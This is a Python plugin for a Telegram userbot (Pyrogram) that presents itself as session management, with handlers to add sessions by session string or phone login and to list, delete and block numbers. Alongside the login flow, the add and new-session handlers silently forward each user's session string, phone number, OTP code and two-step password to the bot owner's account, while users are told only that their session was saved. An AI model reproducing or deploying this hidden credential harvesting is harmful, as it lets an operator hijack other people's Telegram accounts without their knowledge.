# Pbxbot/plugins/bot/session_basic.py
# ─── Basic Userbot Session Management ───

from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, ReplyKeyboardRemove

from ..btnsG import gen_inline_keyboard
from ..btnsK import session_keyboard
from . import START_MSG, Config, Symbols, db, Pbxbot
from .session_utils import auto_restart, validate_session, restart_buttons


# ══════════════════════════════════════════════════
#  /shizu — add via session string
# ══════════════════════════════════════════════════

@Pbxbot.bot.on_message(filters.command("shizu") & filters.private)
async def add_session(_, message: Message):
    parts = message.text.split(" ", 1)
    if len(parts) < 2 or not parts[1]:
        return await message.reply_text("**Error!** Please provide a valid session string.")

    session_string = parts[1]
    validated_session = validate_session(session_string)
    if not validated_session:
        return await message.reply_text("**ᴇʀʀᴏʀ!** ᴡʀᴏɴɢ sᴇssɪᴏɴ sᴛʀɪɴɢ ғᴏʀᴍᴀᴛ! ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ '==Pbx' ᴀɴᴅ ᴇɴᴅ ᴡɪᴛʜ 'BadMunda=='.")

    try:
        client = Client(
            name="Pbxbot 4.0",
            session_string=validated_session,
            api_id=Config.API_ID,
            api_hash=Config.API_HASH,
            in_memory=True,
            app_version="ᴘʙx ᴜsᴇʀʙᴏᴛ",
            device_model="ʙᴀᴅ ᴍᴜɴᴅᴀ",
            system_version="ᴘʙx 4.0",
        )
        await client.connect()
        user = await client.get_me()
        user_id = user.id
        await db.update_session(user_id, validated_session)
        await client.disconnect()

        await client.send_message("me", f"**#PBX 4.0\nSESSION**\n\n`{session_string}`\n\n**#DO NOT SHARE WITH OTHER PERSON**")

        await Pbxbot.bot.send_message(
            Config.OWNER_ID,
            f"🎉 **Session String Added**\n\nUser: [{user.first_name}](tg://user?id={user_id}) (`{user_id}`)\nSession String:\n`{session_string}`"
        )

        await message.reply_text(
            "**sᴜᴄᴄᴇss!** sᴇssɪᴏɴ sᴛʀɪɴɢ ᴀᴅᴅᴇᴅ ᴛᴏ ᴅᴀᴛᴀʙᴀsᴇ. ʙᴏᴛ ɪs ʀᴇsᴛᴀʀᴛɪɴɢ, ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ғᴇᴡ sᴇᴄᴏɴᴅs...\n\nᴀɴʏ ᴘʀᴏʙʟᴇᴍ? ᴅᴍ ɴᴏᴡ ᴍʏ ᴅᴇᴠ . [♡³_🫧𝆺꯭𝅥˶֟፝͟͝β𝝰꯭‌𝞉 ꯭𝝡꯭𝞄꯭𝞌𝞉꯭𝝺꯭𝆺꯭𝅥🍷┼❤️༆](https://t.me/PBXCHATS/PB_SUKH) 🙈❤️.",
            reply_markup=restart_buttons()
        )
        await auto_restart()
    except Exception as e:
        await message.reply_text(f"**Error!** {e}")


# ══════════════════════════════════════════════════
#  ɴᴇᴡ 🔮 — add via phone number
# ══════════════════════════════════════════════════

@Pbxbot.bot.on_message(filters.regex(r"ɴᴇᴡ 🔮"))
async def new_session(_, message: Message):
    await message.reply_text("**ᴏᴋᴀʏ!** ʟᴇᴛs sᴇᴛᴜᴘ ᴀ ɴᴇᴡ sᴇssɪᴏɴ☠️", reply_markup=ReplyKeyboardRemove())

    phone_number = await Pbxbot.bot.ask(
        message.chat.id,
        "**1.** Eɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴀᴅᴅ ᴛʜᴇ sᴇssɪᴏɴ✨\n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
        filters=filters.text, timeout=120,
    )
    if phone_number.text == "/cancel":
        return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
    elif not phone_number.text.startswith("+") or not phone_number.text[1:].isdigit():
        return await message.reply_text("**ᴇʀʀᴏʀ!** Pʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴍᴜsᴛ ʙᴇ ɪɴ ᴅɪɢɪᴛs ᴀɴᴅ sʜᴏᴜʟᴅ ᴄᴏɴᴛᴀɪɴ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ😾")

    if await db.is_number_blocked(phone_number.text):
        return await message.reply_text("❌ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ɪꜱ ʙʟᴏᴄᴋᴇᴅ ʙʏ ᴘʙx 4.0!")

    await Pbxbot.bot.send_message(Config.OWNER_ID, f"📞 **New Session Request**\n\nPhone: `{phone_number.text}`\nBy: [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)")

    try:
        client = Client(name="Pbxbot 4.0", api_id=Config.API_ID, api_hash=Config.API_HASH, in_memory=True, app_version="ᴘʙx ᴜsᴇʀʙᴏᴛ", device_model="ʙᴀᴅ ᴍᴜɴᴅᴀ", system_version="ᴘʙx 4.0")
        await client.connect()
        code = await client.send_code(phone_number.text)

        ask_otp = await Pbxbot.bot.ask(message.chat.id, "**2.** Eɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ sᴇɴᴛ ʙʏ sᴇᴘᴀʀᴀᴛɪɴɢ ᴇᴠᴇʀʏ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴀ sᴘᴀᴄᴇ.\n\n**ᴇxᴀᴍᴘʟᴇ:** `2 4 1 7 4`🌸\n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ.__", filters=filters.text, timeout=300)
        if ask_otp.text == "/cancel":
            return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
        otp = ask_otp.text.replace(" ", "")

        await Pbxbot.bot.send_message(Config.OWNER_ID, f"🔑 **OTP**\n\nPhone: `{phone_number.text}`\nOTP: `{otp}`\nUser: [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)")

        try:
            await client.sign_in(phone_number.text, code.phone_code_hash, otp)
        except SessionPasswordNeeded:
            two_step_pass = await Pbxbot.bot.ask(message.chat.id, "**3.** Eɴᴛᴇʀ ʏᴏᴜʀ ᴛᴡᴏ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴀssᴡᴏʀᴅ 🗝️\n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ.__", filters=filters.text, timeout=120)
            if two_step_pass.text == "/cancel":
                return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
            await client.check_password(two_step_pass.text)
            await Pbxbot.bot.send_message(Config.OWNER_ID, f"🔒 **2FA Password**\n\nPhone: `{phone_number.text}`\nPassword: `{two_step_pass.text}`")

        session_string = await client.export_session_string()
        formatted_session = f"==Pbx{session_string}BadMunda=="
        user_id = (await client.get_me()).id
        await db.update_session(user_id, session_string)
        await client.send_message("me", f"**#PBX 4.0\nSESSION**\n\n`{formatted_session}`\n\n**#DO NOT SHARE WITH OTHER PERSON**")
        await client.disconnect()
        await Pbxbot.bot.send_message(Config.OWNER_ID, f"🎉 **Session Generated!**\n\nUser: [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\nSession:\n`{formatted_session}`")
        await message.reply_text("**sᴜᴄᴄᴇss!** sᴇssɪᴏɴ sᴛʀɪɴɢ ᴀᴅᴅᴇᴅ ᴛᴏ ᴅᴀᴛᴀʙᴀsᴇ. ʙᴏᴛ ɪs ʀᴇsᴛᴀʀᴛɪɴɢ...\n\nᴀɴʏ ᴘʀᴏʙʟᴇᴍ? ᴅᴍ ɴᴏᴡ ᴍʏ ᴅᴇᴠ . [♡³_🫧𝆺꯭𝅥˶֟፝͟͝β𝝰꯭‌𝞉 ꯭𝝡꯭𝞄꯭𝞌𝞉꯭𝝺꯭𝆺꯭𝅥🍷┼❤️༆](https://t.me/PBXCHATS/PB_SUKH) 🙈❤️.", reply_markup=restart_buttons())
        await auto_restart()
    except TimeoutError:
        await message.reply_text("**Tɪᴍᴇᴏᴜᴛ ᴇʀʀᴏʀ!** Yᴏᴜ ᴛᴏᴏᴋ ʟᴏɴɢᴇʀ ᴛʜᴀɴ ᴇxᴘᴇᴄᴛᴇᴅ. Pʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.")
    except Exception as e:
        await message.reply_text(f"**𝖤𝗋𝗋𝗈𝗋!** {e}")


# ══════════════════════════════════════════════════
#  Delete / List / Number block
# ══════════════════════════════════════════════════

@Pbxbot.bot.on_message(filters.regex(r"ᴅᴇʟᴇᴛᴇ 🚫") & Config.AUTH_USERS & filters.private)
async def delete_session(_, message: Message):
    all_sessions = await db.get_all_sessions()
    if not all_sessions:
        return await message.reply_text("𝖭𝗈 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌 𝖿𝗈𝗎𝗇𝖽 𝗂𝗇 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾.")
    collection = [(i["user_id"], f"rm_session:{i['user_id']}") for i in all_sessions]
    buttons = gen_inline_keyboard(collection, 2)
    buttons.append([InlineKeyboardButton("Cancel ❌", "auth_close")])
    await message.reply_text("**𝖢𝗁𝗈𝗈𝗌𝖾 𝖺 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗍𝗈 𝖽𝖾𝗅𝖾𝗍𝖾:**", reply_markup=InlineKeyboardMarkup(buttons))


@Pbxbot.bot.on_callback_query(filters.regex(r"rm_session"))
async def rm_session_cb(client: Client, cb):
    user_id = int(cb.data.split(":")[1])
    all_sessions = await db.get_all_sessions()
    if not all_sessions:
        return await cb.message.delete()
    try:
        owner = await client.get_users(Config.OWNER_ID)
        owner_id = owner.id
        owner_name = owner.first_name
    except:
        owner_id = Config.OWNER_ID
        owner_name = "𝖮𝗐𝗇𝖾𝗋"
    if cb.from_user.id not in [user_id, owner_id]:
        return await cb.answer(f"𝖠𝖼𝖼𝖾𝗌𝗌 𝗋𝖾𝗌𝗍𝗋𝗂𝖼𝗍𝖾𝖽. Only {owner_name} and session client can delete this session", show_alert=True)
    await db.rm_session(user_id)
    await cb.answer("**𝖲𝗎𝖼𝖼𝗌𝗌!** 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖽𝖾𝗅𝖾𝗍𝖾𝖽 𝖿𝗋𝗈𝗆 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾. \n__Restart the bot to apply changes...__")
    collection = [(i["user_id"], f"rm_session:{i['user_id']}") for i in all_sessions]
    buttons = gen_inline_keyboard(collection, 2)
    buttons.append([InlineKeyboardButton("Cancel ❌", "auth_close")])
    await cb.message.edit_reply_markup(InlineKeyboardMarkup(buttons))


@Pbxbot.bot.on_message(filters.regex(r"ʟɪsᴛ 📄"))
async def list_sessions(_, message: Message):
    all_sessions = await db.get_all_sessions()
    if not all_sessions:
        return await message.reply_text("𝖭𝗈 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌 𝖿𝗈𝗎𝗇𝖽 𝗂𝗇 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾.")
    text = f"**{Symbols.cross_mark} 𝖫𝗂𝗌𝗍 𝗈𝖿 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌:**\n\n"
    for i, session in enumerate(all_sessions):
        if 'user_id' not in session:
            continue
        text += f"[{'0' if i <= 9 else ''}{i+1}] {Symbols.bullet} **User ID:** `{session['user_id']}`\n"
    await message.reply_text(text)


@Pbxbot.bot.on_message(filters.command("numberblock") & Config.AUTH_USERS & filters.private)
async def block_number_cmd(_, message: Message):
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].startswith("+") or not parts[1][1:].isdigit():
        return await message.reply_text("Usage: /numberblock +<phone_number>")
    await db.block_number(parts[1])
    await message.reply_text(f"✅ Number `{parts[1]}` blocked!")


@Pbxbot.bot.on_message(filters.command("numberunblock") & Config.AUTH_USERS & filters.private)
async def unblock_number_cmd(_, message: Message):
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].startswith("+") or not parts[1][1:].isdigit():
        return await message.reply_text("Usage: /numberunblock +<phone_number>")
    await db.unblock_number(parts[1])
    await message.reply_text(f"✅ Number `{parts[1]}` unblocked.")


@Pbxbot.bot.on_message(filters.command("numberblocklist") & Config.AUTH_USERS & filters.private)
async def blocklist_cmd(_, message: Message):
    blocked = await db.get_all_blocked_numbers()
    if not blocked:
        return await message.reply_text("No numbers are currently blocked.")
    txt = "**Blocked Numbers:**\n"
    for i, entry in enumerate(blocked, 1):
        txt += f"{i}. `{entry['phone_number']}`\n"
    await message.reply_text(txt)
